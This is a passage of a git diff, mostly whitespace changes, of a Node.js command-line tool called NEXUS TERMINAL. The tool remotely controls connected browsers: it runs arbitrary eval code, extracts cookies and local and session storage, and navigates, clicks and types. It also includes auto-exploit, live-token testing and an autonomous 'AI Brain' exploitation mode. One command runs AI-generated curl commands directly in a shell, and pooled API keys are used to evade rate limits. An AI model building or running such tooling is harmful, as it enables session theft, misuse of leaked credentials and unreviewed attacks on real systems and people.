+    } catch (e) {
         log(`Failed to establish terminal connection: ${e.message}`, 'red');
         ws.send(JSON.stringify({
             type: 'terminal_error',
@@ -9233,7 +9326,7 @@ async function executeCommandViaProxy(command, proxyConfig, ws) {
             via: proxyConfig.type || 'proxy'
         }));
 
-    } catch(e) {
+    } catch (e) {
         log(`Command execution error: ${e.message}`, 'red');
         ws.send(JSON.stringify({
             type: 'command_error',
@@ -9267,7 +9360,7 @@ async function handleAIQueryViaProxy(query, proxyConfig, ws) {
             via: proxyConfig.type || 'proxy'
         }));
 
-    } catch(e) {
+    } catch (e) {
         log(`AI query error: ${e.message}`, 'red');
         ws.send(JSON.stringify({
             type: 'ai_error',
@@ -9284,56 +9377,56 @@ async function handleAIQueryViaProxy(query, proxyConfig, ws) {
 const CLI = {
     rl: null,
     bulkInputMode: null,  // For bulk key input
-    
+
     start() {
         this.rl = readline.createInterface({
             input: process.stdin,
             output: process.stdout,
             prompt: `${C.magenta}${C.bold}nexus${C.reset}${C.cyan}>${C.reset} `
         });
-        
+
         // Initialize OutputManager with readline
         OutputManager.init(this.rl);
-        
+
         this.rl.on('line', async (line) => {
             await this.handleCommand(line.trim());
             this.rl.prompt();
         });
-        
+
         this.rl.on('close', () => {
             OutputManager.stopSpinner();
             log('Shutting down...', 'yellow');
             process.exit(0);
         });
-        
+
         // Show animated startup
         this.showStartupAnimation();
     },
-    
+
     // Animated startup sequence
     async showStartupAnimation() {
         await OutputManager.showAnimatedHeader('NEXUS TERMINAL v5.0', 'magenta');
         console.log(`${C.dim}Type 'help' for available commands${C.reset}\n`);
         this.rl.prompt();
     },
-    
+
     async handleCommand(input) {
         if (!input) return;
-        
+
         // Handle bulk input mode (for pasting multiple keys)
         if (this.bulkInputMode && this.bulkInputMode.active) {
             if (input.toLowerCase() === 'done') {
                 // Process collected keys
                 const provider = this.bulkInputMode.provider;
                 const keys = this.bulkInputMode.keys;
-                
+
                 if (keys.length > 0) {
                     TerminalAI.addKeysToPool(provider, keys);
                     log(`✅ Added ${keys.length} keys to ${provider.toUpperCase()} pool`, 'green');
                 } else {
                     log('⚠️ No keys were added', 'yellow');
                 }
-                
+
                 this.bulkInputMode = null;
                 return;
             } else if (input.toLowerCase() === 'cancel') {
@@ -9348,22 +9441,22 @@ const CLI = {
             }
             return;
         }
-        
+
         const [cmd, ...args] = input.split(/\s+/);
         const argStr = args.join(' ');
-        
-        switch(cmd.toLowerCase()) {
+
+        switch (cmd.toLowerCase()) {
             // Help
             case 'help':
             case '?':
                 this.showHelp();
                 break;
-            
+
             // Status
             case 'status':
                 this.showStatus();
                 break;
-            
+
             // Execute command
             case 'exec':
             case 'run':
@@ -9372,7 +9465,7 @@ const CLI = {
                     await CommandExecutor.executeWithAI(argStr);
                 }
                 break;
-            
+
             // Send to browser
             case 'browser':
             case 'b':
@@ -9380,7 +9473,7 @@ const CLI = {
                     sendToBrowser('eval', { code: argStr });
                 }
                 break;
-            
+
             // Send message to browser
             case 'msg':
             case 'message':
@@ -9391,17 +9484,17 @@ const CLI = {
                     log('Usage: msg <message>', 'yellow');
                 }
                 break;
-            
+
             // Run scan on browser
             case 'scan':
                 sendToBrowser('eval', { code: 'start()' });
                 break;
-            
+
             // Run bounty on browser
             case 'bounty':
                 sendToBrowser('eval', { code: 'bounty()' });
                 break;
-            
+
             // AI query
             case 'ai':
                 if (argStr) {
@@ -9412,7 +9505,7 @@ const CLI = {
                     console.log();
                 }
                 break;
-            
+
             // Set AI key (auto-detects provider)
             case 'ai-key':
                 if (argStr) {
@@ -9427,7 +9520,7 @@ const CLI = {
                     log('Supports: Gemini (AIza...), Groq (gsk_...), OpenAI (sk-...)', 'cyan');
                 }
                 break;
-            
+
             // Set AI provider
             case 'ai-provider':
                 if (argStr) {
@@ -9436,7 +9529,7 @@ const CLI = {
                     log(`AI provider set to: ${argStr}`, 'magenta');
                 }
                 break;
-            
+
             // Test AI connection
             case 'ai-test':
             case 'test-ai':
@@ -9448,12 +9541,12 @@ const CLI = {
                     '',
                     'Testing connection...'
                 ], 'cyan');
-                
+
                 if (!TerminalAI.config.apiKey) {
                     log('❌ No API key set! Use: ai-key YOUR_KEY', 'red');
                     break;
                 }
-                
+
                 try {
                     const testResponse = await TerminalAI.query('Say "AI is working!" and nothing else.', {});
                     if (testResponse && !testResponse.error) {
@@ -9469,11 +9562,11 @@ const CLI = {
                         log('  3. Try a different provider: ai-provider gemini', 'dim');
                         log('  4. Get free Groq key: https://console.groq.com', 'dim');
                     }
-                } catch(e) {
+                } catch (e) {
                     log(`❌ AI TEST ERROR: ${e.message}`, 'red');
                 }
                 break;
-            
+
             // Reset AI availability (force resume from pause)
             case 'ai-reset':
             case 'aireset':
@@ -9484,7 +9577,7 @@ const CLI = {
                 ProRateLimiter.adaptive.currentPenalty = { groq: 1, gemini: 1, openai: 1, deepseek: 1, together: 1, mistral: 1 };
                 log('✅ AI reset! All cooldowns cleared.', 'green');
                 break;
-            
+
             // Show AI status
             case 'ai-status':
             case 'aistatus':
@@ -9503,7 +9596,7 @@ const CLI = {
                     '  quiet       Enable quiet mode'
                 ], aiStatus.available ? 'green' : 'yellow');
                 break;
-            
+
             // === GUARANTEED AI STATS ===
             case 'gai':
             case 'gai-stats':
@@ -9531,7 +9624,7 @@ const CLI = {
                     '   }))'
                 ], 'cyan');
                 break;
-            
+
             case 'gai-clear':
                 GuaranteedAI.cache.clear();
                 GuaranteedAI.stats.cacheHits = 0;
@@ -9540,7 +9633,7 @@ const CLI = {
                 GuaranteedAI.stats.successes = 0;
                 log('✅ GuaranteedAI cache and stats cleared!', 'green');
                 break;
-            
+
             // === ULTRA RATE LIMIT BYPASS STATUS ===
             case 'bypass':
             case 'bypass-status':
@@ -9548,7 +9641,7 @@ const CLI = {
             case 'ultra-status':
                 UltraRateLimitBypass.showStatus();
                 break;
-            
+
             case 'bypass-reset':
             case 'ultra-reset':
                 UltraRateLimitBypass.cache.clear();
@@ -9560,29 +9653,29 @@ const CLI = {
                 });
                 log('✅ UltraBypass reset! All providers cleared.', 'green');
                 break;
-            
+
             // === AI REQUEST QUEUE COMMANDS ===
             case 'queue':
             case 'queue-status':
             case 'qstatus':
                 AIRequestQueue.showStatus();
                 break;
-            
+
             case 'queue-enable':
             case 'qenable':
                 AIRequestQueue.enable();
                 break;
-            
+
             case 'queue-disable':
             case 'qdisable':
                 AIRequestQueue.disable();
                 break;
-            
+
             case 'queue-clear':
             case 'qclear':
                 AIRequestQueue.clear();
                 break;
-            
+
             // === BACKUP PROVIDER COMMANDS ===
             case 'setbackup':
             case 'backup':
@@ -9593,7 +9686,7 @@ const CLI = {
                     log('Providers: groq, openai, deepseek, together, mistral, openrouter', 'cyan');
                 }
                 break;
-            
+
             case 'setgroq':
                 if (argStr) {
                     // Set as MAIN key AND backup
@@ -9604,7 +9697,7 @@ const CLI = {
                     log('Usage: setgroq <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'setopenai':
                 if (argStr) {
                     TerminalAI.init(argStr, 'openai');
@@ -9614,7 +9707,7 @@ const CLI = {
                     log('Usage: setopenai <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'setdeepseek':
                 if (argStr) {
                     TerminalAI.init(argStr, 'deepseek');
@@ -9624,7 +9717,7 @@ const CLI = {
                     log('Usage: setdeepseek <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'settogether':
                 if (argStr) {
                     TerminalAI.init(argStr, 'together');
@@ -9634,7 +9727,7 @@ const CLI = {
                     log('Usage: settogether <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'setmistral':
                 if (argStr) {
                     TerminalAI.init(argStr, 'mistral');
@@ -9644,7 +9737,7 @@ const CLI = {
                     log('Usage: setmistral <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'setgemini':
                 if (argStr) {
                     TerminalAI.init(argStr, 'gemini');
@@ -9654,12 +9747,12 @@ const CLI = {
                     log('Usage: setgemini <api-key>', 'yellow');
                 }
                 break;
-            
+
             case 'backups':
             case 'showbackups':
                 TerminalAI.showBackups();
                 break;
-            
+
             case 'sethf':
             case 'sethuggingface':
                 if (argStr) {
@@ -9670,14 +9763,14 @@ const CLI = {
                     log('Get free token: https://huggingface.co/settings/tokens', 'cyan');
                 }
                 break;
-            
+
             case 'resethf':
             case 'resethuggingface':
                 TerminalAI.freeProviders.huggingface.failures = 0;
                 TerminalAI.freeProviders.huggingface.rateLimitReset = 0;
                 log('✅ HuggingFace reset - can be used again', 'green');
                 break;
-            
+
             case 'apihelp':
             case 'keys':
             case 'api-help':
@@ -9753,11 +9846,11 @@ const CLI = {
                     ''
                 ], 'cyan');
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // 🔑 BULK API KEY POOL COMMANDS
             // ═══════════════════════════════════════════════════════════
-            
+
             case 'addkey':
                 if (args.length >= 2) {
                     const provider = args[0].toLowerCase();
@@ -9769,7 +9862,7 @@ const CLI = {
                     log('Providers: groq, gemini, openai, deepseek, together, mistral, huggingface', 'cyan');
                 }
                 break;
-            
+
             case 'addkeys':
                 if (args.length >= 2) {
                     const provider = args[0].toLowerCase();
@@ -9780,14 +9873,14 @@ const CLI = {
                     log('Example: addkeys groq gsk_key1 gsk_key2 gsk_key3', 'cyan');
                 }
                 break;
-            
+
             case 'bulkkeys':
                 if (args.length >= 1) {
                     const provider = args[0].toLowerCase();
                     log(`📋 Paste your ${provider.toUpperCase()} API keys (one per line)`, 'cyan');
                     log('   When done, type "done" and press Enter', 'yellow');
                     log('', 'white');
-                    
+
                     // Set bulk input mode
                     TerminalCLI.bulkInputMode = {
                         active: true,
@@ -9800,14 +9893,14 @@ const CLI = {
                     log('Then paste keys one per line, type "done" when finished', 'cyan');
                 }
                 break;
-            
+
             case 'keypool':
             case 'showkeys':
             case 'keys-status':
             case 'pool':
                 TerminalAI.showKeyPool();
                 break;
-            
+
             case 'removekey':
                 if (args.length >= 2) {
                     const provider = args[0].toLowerCase();
@@ -9818,7 +9911,7 @@ const CLI = {
                     log('Example: removekey groq 2 (removes 2nd groq key)', 'cyan');
                 }
                 break;
-            
+
             case 'clearkeys':
                 if (args.length >= 1) {
                     const provider = args[0].toLowerCase();
@@ -9830,19 +9923,19 @@ const CLI = {
                     log('Usage: clearkeys <provider>', 'yellow');
                 }
                 break;
-            
+
             case 'cleardeadkeys':
             case 'cleandead':
                 const removed = TerminalAI.clearDeadKeys(args[0] || null);
                 break;
-            
+
             case 'ratelimit':
             case 'rl':
             case 'limiter':
             case 'ratestatus':
                 ProRateLimiter.showStatus();
                 break;
-            
+
             case 'resetlimiter':
             case 'resetrl':
                 // Reset all penalties
@@ -9853,35 +9946,35 @@ const CLI = {
                 });
                 log('🔄 Rate limiter penalties reset', 'green');
                 break;
-            
+
             // === BACKGROUND TASK COMMANDS ===
             case 'bg':
             case 'bgtasks':
             case 'background':
                 BackgroundTaskManager.showStatus();
                 break;
-            
+
             case 'bglogs':
             case 'bglog':
                 const logLines = parseInt(args[0]) || 30;
                 BackgroundTaskManager.viewLogs(logLines);
                 break;
-            
+
             case 'bgsilent':
                 BackgroundTaskManager.toggleSilent();
                 break;
-            
+
             case 'bgclear':
                 const cleared = BackgroundTaskManager.clearCompleted();
                 log(`🧹 Cleared ${cleared} completed tasks`, 'cyan');
                 break;
-            
+
             // === OUTPUT MANAGER COMMANDS ===
             case 'cleanmode':
             case 'clean':
                 OutputManager.toggleCleanMode();
                 break;
-            
+
             case 'spinner':
                 if (args[0] === 'stop') {
                     OutputManager.stopSpinner('Stopped', 'yellow');
@@ -9890,12 +9983,12 @@ const CLI = {
                     setTimeout(() => OutputManager.stopSpinner('Demo complete!'), 3000);
                 }
                 break;
-            
+
             case 'demo':
                 // Demo the CLI animations
                 await this.runAnimationDemo();
                 break;
-            
+
             // === BACKGROUND LOG COMMANDS ===
             case 'quiet':
             case 'quietmode':
@@ -9916,19 +10009,19 @@ const CLI = {
                     log('🔔 Quiet mode DISABLED - all logs shown in terminal', 'yellow');
                 }
                 break;
-            
+
             case 'loud':
             case 'verbose':
                 CONFIG.QUIET_MODE = false;
                 log('🔔 Verbose mode - all logs shown in terminal', 'yellow');
                 break;
-            
+
             case 'logs':
             case 'viewlogs':
             case 'logviewer':
                 BackgroundLogger.openViewer();
                 break;
-            
+
             case 'bglogs':
             case 'background':
             case 'bgstatus':
@@ -9944,13 +10037,13 @@ const CLI = {
                     log(`\n💡 Use 'logs' to open full viewer in browser`, 'dim');
                 }
                 break;
-            
+
             case 'clearlogs':
             case 'clearbackground':
                 BackgroundLogger.clear();
                 log('🧹 Background logs cleared', 'green');
                 break;
-            
+
             // === ANALYZE SPECIFIC FINDING FROM MASTER EXPLOIT ===
             case 'analyze':
             case 'analysefinding':
@@ -9959,14 +10052,14 @@ const CLI = {
                     log('❌ No findings available. Run autoexploit in browser first.', 'yellow');
                     break;
                 }
-                
+
                 if (!args[0]) {
                     // Show list of findings
                     log(`📋 ${findings.length} findings available:`, 'cyan');
                     findings.slice(0, 20).forEach((f, i) => {
                         const keyPreview = f.key?.substring(0, 30) || '?';
                         const status = f.isVulnerable ? `${C.green}✅ VULN${C.reset}` : `${C.dim}○${C.reset}`;
-                        console.log(`${C.cyan}  [${i+1}]${C.reset} ${status} ${f.type}: ${keyPreview}...`);
+                        console.log(`${C.cyan}  [${i + 1}]${C.reset} ${status} ${f.type}: ${keyPreview}...`);
                     });
                     if (findings.length > 20) {
                         log(`   ... and ${findings.length - 20} more`, 'dim');
@@ -9978,12 +10071,12 @@ const CLI = {
                         log(`❌ Invalid index. Use 1-${findings.length}`, 'red');
                         break;
                     }
-                    
+
                     const finding = findings[idx];
                     log(`🔍 Analyzing finding #${idx + 1}: ${finding.type}`, 'magenta');
                     console.log(`${C.dim}Key: ${finding.key?.substring(0, 50)}...${C.reset}`);
                     console.log(`${C.dim}Source: ${finding.source}${C.reset}`);
-                    
+
                     if (finding.aiPrompt && TerminalAI.config.apiKey) {
                         log('🤖 Querying AI...', 'magenta');
                         await ProRateLimiter.smartWait(TerminalAI.config.provider || 'groq');
@@ -9996,7 +10089,7 @@ const CLI = {
                     }
                 }
                 break;
-            
+
             case 'findings':
             case 'showfindings':
                 const allFindings = DataStore.data.masterExploitResults || DataStore.data.findings || [];
@@ -10008,21 +10101,21 @@ const CLI = {
                         const keyPreview = f.key?.substring(0, 25) || f.value?.substring(0, 25) || '?';
                         const sev = f.severity || 'MEDIUM';
                         const sevColor = sev === 'CRITICAL' ? C.red : sev === 'HIGH' ? C.yellow : C.dim;
-                        console.log(`${C.cyan}  [${i+1}]${C.reset} ${sevColor}${sev}${C.reset} ${f.type}: ${keyPreview}...`);
+                        console.log(`${C.cyan}  [${i + 1}]${C.reset} ${sevColor}${sev}${C.reset} ${f.type}: ${keyPreview}...`);
                     });
                 }
                 break;
-            
+
             case 'savekeys':
             case 'savepool':
                 TerminalAI.saveKeyPool();
                 break;
-            
+
             case 'loadkeys':
             case 'loadpool':
                 TerminalAI.loadKeyPool();
                 break;
-            
+
             case 'rotatekey':
                 if (args.length >= 1) {
                     const provider = args[0].toLowerCase();
@@ -10034,21 +10127,21 @@ const CLI = {
                     log('Usage: rotatekey <provider>', 'yellow');
                 }
                 break;
-            
+
             // Show findings
             case 'findings':
                 this.showFindings();
                 break;
-            
+
             // Show exploit results
             case 'results':
                 this.showResults();
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // 🔥 AUTONOMOUS EXPLOITER COMMANDS
             // ═══════════════════════════════════════════════════════════
-            
+
             case 'autoexploit':
             case 'pwn':
                 if (DataStore.data.findings.length > 0) {
@@ -10059,13 +10152,13 @@ const CLI = {
                     log('⚠️ No findings available. Run scan first: scan', 'yellow');
                 }
                 break;
-            
+
             case 'exploit-stop':
             case 'stop-exploit':
             case 'pwn-stop':
                 AutonomousExploiter.stop();
                 break;
-            
+
             case 'exploit-status':
             case 'pwn-status':
                 const status = AutonomousExploiter.status();
@@ -10078,13 +10171,13 @@ const CLI = {
                     `Scripts: ${status.scriptsGenerated}`
                 ], 'red');
                 break;
-            
+
             case 'vulns':
             case 'vulnerabilities':
                 if (AutonomousExploiter.vulnerabilitiesFound.length > 0) {
                     log('\n🔴 DISCOVERED VULNERABILITIES:', 'red');
                     AutonomousExploiter.vulnerabilitiesFound.forEach((v, i) => {
-                        log(`\n[${i+1}] ${v.analysis?.vulnerabilityType || 'Unknown'}`, 'yellow');
+                        log(`\n[${i + 1}] ${v.analysis?.vulnerabilityType || 'Unknown'}`, 'yellow');
                         log(`    Confidence: ${v.analysis?.confidenceLevel || 'N/A'}`, 'white');
                         log(`    Command: ${v.command.substring(0, 60)}...`, 'cyan');
                         if (v.analysis?.proofOfConcept) {
@@ -10095,7 +10188,7 @@ const CLI = {
                     log('No vulnerabilities found yet. Run: autoexploit', 'yellow');
                 }
                 break;
-            
+
             case 'scripts':
                 if (AutonomousExploiter.scriptsGenerated.length > 0) {
                     log('\n📜 GENERATED SCRIPTS:', 'magenta');
@@ -10106,11 +10199,11 @@ const CLI = {
                     log('No scripts generated yet', 'yellow');
                 }
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // 🔑 TOKEN TESTER COMMANDS
             // ═══════════════════════════════════════════════════════════
-            
+
             case 'testkeys':
             case 'testtokens':
             case 'test-all':
@@ -10121,7 +10214,7 @@ const CLI = {
                     log('⚠️ No findings available. Run scan first: scan', 'yellow');
                 }
                 break;
-            
+
             case 'test-status':
                 const tStatus = TokenTester.status();
                 logBox('🔑 TOKEN TESTER STATUS', [
@@ -10132,13 +10225,13 @@ const CLI = {
                     `Errors: ${tStatus.stats.errors}`
                 ], 'cyan');
                 break;
-            
+
             case 'livekeys':
             case 'livetokens':
                 if (TokenTester.liveTokens.length > 0) {
                     log('\n✅ LIVE TOKENS:', 'green');
                     TokenTester.liveTokens.forEach((t, i) => {
-                        log(`\n[${i+1}] ${t.type.toUpperCase()}`, 'yellow');
+                        log(`\n[${i + 1}] ${t.type.toUpperCase()}`, 'yellow');
                         log(`    Token: ${t.value.substring(0, 40)}...`, 'cyan');
                         log(`    Result: ${JSON.stringify(t.result).substring(0, 80)}`, 'white');
                         log(`    Source: ${t.finding.source || 'unknown'}`, 'dim');
@@ -10147,7 +10240,7 @@ const CLI = {
                     log('No live tokens found yet. Run: testkeys', 'yellow');
                 }
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // 🧠 AI BRAIN - AUTONOMOUS THINKING ENGINE
             // ═══════════════════════════════════════════════════════════
@@ -10162,14 +10255,14 @@ const CLI = {
                     log('⚠️ No findings. Run scan first: scan', 'yellow');
                     break;
                 }
-                
+
                 log('🧠 STARTING AI BRAIN - AUTONOMOUS MODE', 'magenta');
                 log('   AI will think, decide, and act on its own...', 'cyan');
-                
+
                 // Get first connected browser's WebSocket
                 const firstBrowser = connectedBrowsers.values().next().value;
                 const brainWs = firstBrowser?.ws || null;
-                
+
                 AIBrain.init(brainWs, DataStore.data.findings, DataStore.data.browserData?.domain);
                 AIBrain.startThinking().then(report => {
                     if (report) {
@@ -10186,13 +10279,13 @@ const CLI = {
                     log(`❌ AI Brain error: ${err.message}`, 'red');
                 });
                 break;
-            
+
             case 'brain-stop':
             case 'think-stop':
                 AIBrain.stop();
                 log('🛑 AI Brain stopped', 'yellow');
                 break;
-            
+
             case 'brain-status':
             case 'think-status':
                 logBox('🧠 AI BRAIN STATUS', [
@@ -10205,14 +10298,14 @@ const CLI = {
                     `Knowledge: ${Object.keys(AIBrain.memory.knowledge).length} keys`
                 ], 'cyan');
                 break;
-            
+
             case 'discoveries':
             case 'brain-discoveries':
                 if (AIBrain.memory.discoveries.length > 0) {
                     log('\n🎯 AI DISCOVERIES:', 'green');
                     AIBrain.memory.discoveries.forEach((d, i) => {
                         const sevColor = d.severity === 'critical' ? 'red' : d.severity === 'high' ? 'yellow' : 'cyan';
-                        log(`\n[${i+1}] ${d.severity?.toUpperCase() || 'INFO'}`, sevColor);
+                        log(`\n[${i + 1}] ${d.severity?.toUpperCase() || 'INFO'}`, sevColor);
                         log(`    ${d.discovery}`, 'white');
                         log(`    Context: ${(d.context || '').substring(0, 60)}`, 'dim');
                     });
@@ -10220,7 +10313,7 @@ const CLI = {
                     log('No discoveries yet. Run: brain', 'yellow');
                 }
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // 🚀 FULL AUTOMATION - ONE CLICK EVERYTHING
             // ═══════════════════════════════════════════════════════════
@@ -10232,7 +10325,7 @@ const CLI = {
                     log('⚠️ AI not configured. Use: ai-key YOUR_KEY', 'yellow');
                     break;
                 }
-                
+
                 log('🚀 STARTING FULL AUTOMATION', 'red');
                 log('   Phase 1: Token Testing (all tokens)', 'cyan');
                 log('   Phase 2: AI Brain (autonomous thinking)', 'cyan');
@@ -10240,9 +10333,9 @@ const CLI = {
                 log('   Phase 4: Master Report Generation', 'cyan');
                 log('', 'white');
                 log('   ⚠️ This will run EVERYTHING automatically!', 'yellow');
-                
+
                 const fullWs = connectedBrowsers.values().next().value?.ws || null;
-                
+
                 FullAutomation.start(fullWs, DataStore.data.findings, DataStore.data.browserData)
                     .then(report => {
                         logBox('🏆 FULL AUTOMATION COMPLETE', [
@@ -10254,71 +10347,71 @@ const CLI = {
                         ], 'green');
                     });
                 break;
-            
+
             case 'fullstop':
             case 'stopall':
                 FullAutomation.stop();
                 log('🛑 Full automation stopped', 'yellow');
                 break;
-            
+
             // Clear
             case 'clear':
             case 'cls':
                 console.clear();
                 break;
-            
+
             // Export
             case 'export':
                 this.exportData(argStr || 'nexus-export.json');
                 break;
-            
+
             // Exploit specific finding
             case 'exploit':
                 if (argStr) {
                     await this.exploitFinding(parseInt(argStr));
                 }
                 break;
-            
+
             // Auto-exploit all
             case 'auto':
             case 'autopwn':
                 await this.autoExploit();
                 break;
-            
+
             // Show browsers
             case 'browsers':
                 this.showBrowsers();
                 break;
-            
+
             // ═══════════════════════════════════════════════════════════
             // ADVANCED BROWSER CONTROL COMMANDS
             // ═══════════════════════════════════════════════════════════
-            
+
             // Get all data from browsers
             case 'getdata':
             case 'extract':
                 sendToBrowser('get_all_data');
                 log('📥 Requesting all data from browsers...', 'blue');
                 break;
-            
+
             // Get findings from browsers
             case 'getfindings':
                 sendToBrowser('get_findings');
                 log('📥 Requesting findings from browsers...', 'blue');
                 break;
-            
+
             // Get cookies from browsers
             case 'cookies':
                 sendToBrowser('get_cookies');
                 log('📥 Requesting cookies from browsers...', 'blue');
                 break;
-            
+
             // Get storage from browsers
             case 'storage':
                 sendToBrowser('get_storage');
                 log('📥 Requesting localStorage/sessionStorage...', 'blue');
                 break;
-            
+
             // Navigate browser
             case 'goto':
             case 'navigate':
@@ -10327,7 +10420,7 @@ const CLI = {
                     log(`🌐 Navigating browsers to: ${argStr}`, 'blue');
                 }
                 break;
-            
+
             // Click element
             case 'click':
                 if (argStr) {
@@ -10335,7 +10428,7 @@ const CLI = {
                     log(`👆 Clicking: ${argStr}`, 'blue');
                 }
                 break;
-            
+
             // Type in element
             case 'type':
                 const [selector, ...textParts] = argStr.split(' ');
@@ -10345,13 +10438,13 @@ const CLI = {
                     log(`⌨️ Typing in ${selector}`, 'blue');
                 }
                 break;
-            
+
             // Get HTML
             case 'html':
                 sendToBrowser('get_html', { selector: argStr || 'body' });
                 log('📄 Requesting HTML...', 'blue');
                 break;
-            
+
             // Fetch URL from browser
             case 'fetch':
                 if (argStr) {
@@ -10359,7 +10452,7 @@ const CLI = {
                     log(`🌐 Fetching: ${argStr}`, 'blue');
                 }
                 break;
-            
+
             // AI query through browser
             case 'browser-ai':
             case 'bai':
@@ -10368,20 +10461,20 @@ const CLI = {
                     log('🤖 Sending AI query to browser...', 'magenta');
                 }
                 break;
-            
+
             // Ping all browsers
             case 'ping':
                 sendToBrowser('status');
                 log('📡 Pinging all browsers...', 'blue');
                 break;
-            
+
             // Sync all browsers
             case 'sync':
                 sendToBrowser('sync');
                 sendToBrowser('get_findings');
                 log('🔄 Full sync initiated with all browsers...', 'blue');
                 break;
-            
+
             // === AI COLLABORATION COMMANDS ===
             case 'collab':
             case 'collaborate':
@@ -10400,32 +10493,32 @@ const CLI = {
                 log('📥 Requested browser data for AI collaboration', 'blue');
                 log('   AI will auto-analyze when data arrives', 'dim');
                 break;
-            
+
             case 'collab-log':
             case 'collablog':
                 if (TerminalAI.collaborationLog.length === 0) {
                     log('No collaboration history yet.', 'yellow');
                 } else {
-                    logBox('🤝 AI COLLABORATION LOG', 
-                        TerminalAI.collaborationLog.slice(-10).map(c => 
+                    logBox('🤝 AI COLLABORATION LOG',
+                        TerminalAI.collaborationLog.slice(-10).map(c =>
                             `${c.timestamp.split('T')[1]?.split('.')[0] || ''} | ${c.direction} | ${c.findingsReceived || 0} findings`
                         )
-                    , 'magenta');
+                        , 'magenta');
                 }
                 break;
-            
+
             case 'collab-mode':
                 CONFIG.AI_COLLAB_MODE = !CONFIG.AI_COLLAB_MODE;
                 TerminalAI.config.collaborationMode = CONFIG.AI_COLLAB_MODE;
                 log(`AI Collaboration mode: ${CONFIG.AI_COLLAB_MODE ? 'ENABLED' : 'DISABLED'}`, CONFIG.AI_COLLAB_MODE ? 'green' : 'yellow');
                 break;
-            
+
             case 'auto-sync':
             case 'autosync':
                 CONFIG.AUTO_SYNC = !CONFIG.AUTO_SYNC;
                 log(`Auto-sync: ${CONFIG.AUTO_SYNC ? 'ENABLED' : 'DISABLED'}`, CONFIG.AUTO_SYNC ? 'green' : 'yellow');
                 break;
-            
+
             case 'deep':
             case 'deep-analysis':
             case 'analyze':
@@ -10433,11 +10526,11 @@ const CLI = {
                     log('❌ AI not configured. Use: ai-key YOUR_KEY', 'red');
                     break;
                 }
-                
+
                 // Try to get findings from stored report or DataStore
                 let deepFindings = [];
                 const storedReport = DataStore.getCustom('lastAIAgentReport');
-                
+
                 if (storedReport?.findings?.length > 0) {
                     deepFindings = storedReport.findings;
                     log(`📋 Using ${deepFindings.length} findings from last AI Agent report`, 'cyan');
@@ -10451,16 +10544,16 @@ const CLI = {
                     log('No findings to analyze. Run sync or aiAgent() in browser first.', 'yellow');
                     break;
                 }
-                
+
                 log('🔬 DEEP ANALYSIS WITH COMMAND EXECUTION...', 'magenta');
-                
+
                 // Deep analysis for each finding with curl execution
                 for (let i = 0; i < Math.min(deepFindings.length, 15); i++) {
                     const f = deepFindings[i];
                     const fullValue = f.fullValue || f.value;
-                    
-                    log(`\n[${i+1}/${Math.min(deepFindings.length, 15)}] Analyzing: ${f.type}...`, 'cyan');
-                    
+
+                    log(`\n[${i + 1}/${Math.min(deepFindings.length, 15)}] Analyzing: ${f.type}...`, 'cyan');
+
                     const deepPrompt = `You are an expert bug bounty hunter. Analyze this finding and provide validation:
 
 FINDING:
@@ -10483,21 +10576,21 @@ Respond in JSON only:
     "severity": "CRITICAL/HIGH/MEDIUM/LOW",
     "bountyEstimate": "$X-$Y"
 }`;
-                    
+
                     const analysis = await TerminalAI.query(deepPrompt, { systemPrompt: 'Respond only with valid JSON.' });
-                    
+
                     if (analysis && !analysis.error) {
                         try {
                             const jsonMatch = analysis.match(/\{[\s\S]*?\}/);
                             if (jsonMatch) {
                                 const parsed = JSON.parse(jsonMatch[0]);
-                                
+
                                 if (parsed.isFalsePositive) {
                                     console.log(`${C.yellow}   ⚠️ FALSE POSITIVE: ${parsed.reason}${C.reset}`);
                                 } else {
                                     console.log(`${C.green}   ✅ ${parsed.service} - ${parsed.severity}${C.reset}`);
                                     console.log(`${C.magenta}   Bounty: ${parsed.bountyEstimate}${C.reset}`);
-                                    
+
                                     // Execute curl if provided
                                     if (parsed.curlCommand) {
                                         console.log(`${C.dim}   Executing: ${parsed.curlCommand.substring(0, 80)}...${C.reset}`);
@@ -10508,11 +10601,11 @@ Respond in JSON only:
                                                     resolve({ stdout, stderr, error: err?.message });
                                                 });
                                             });
-                                            
+
                                             if (curlRes.stdout) {
                                                 const preview = curlRes.stdout.substring(0, 200);
                                                 console.log(`${C.cyan}   Response: ${preview}${curlRes.stdout.length > 200 ? '...' : ''}${C.reset}`);
-                                                
+
                                                 // Quick check if response indicates valid token
                                                 if (curlRes.stdout.includes('"error"') || curlRes.stdout.includes('invalid') || curlRes.stdout.includes('unauthorized')) {
                                                     console.log(`${C.dim}   ⚪ Token appears invalid${C.reset}`);
@@ -10520,28 +10613,28 @@ Respond in JSON only:
                                                     console.log(`${C.red}   🔴 TOKEN APPEARS VALID!${C.reset}`);
                                                 }
                                             }
-                                        } catch(e) {
+                                        } catch (e) {
                                             console.log(`${C.dim}   ⚠️ Execution error: ${e.message}${C.reset}`);
                                         }
                                     }
                                 }
                             }
-                        } catch(e) {
+                        } catch (e) {
                             console.log(`${C.dim}   AI: ${analysis.substring(0, 150)}...${C.reset}`);
                         }
                     }
                 }
-                
+
                 log('\n✅ Deep analysis complete!', 'green');
                 break;
-            
+
             // Exit
             case 'exit':
             case 'quit':
             case 'q':
                 process.exit(0);
                 break;
-            
+
             default:
                 // Try as shell command
                 if (CommandExecutor.isAllowed(cmd)) {
@@ -10551,28 +10644,28 @@ Respond in JSON only:
                 }
         }
     },
-    
+
     // Animation demo
     async runAnimationDemo() {
         console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.cyan}   🎨 CLI ANIMATION DEMO${C.reset}`);
         console.log(`${C.bold}${C.cyan}═══════════════════════════════════════${C.reset}\n`);
-        
+
         // Animated header
         await OutputManager.showAnimatedHeader('NEXUS AI SYSTEM', 'magenta');
         await OutputManager._delay(500);
-        
+
         // Type writer effect
         console.log();
         await OutputManager.typeWriter('  Loading advanced modules...', 25, 'cyan');
         await OutputManager._delay(300);
-        
+
         // Spinner demo
         OutputManager.startSpinner('Initializing AI engine', 'yellow');
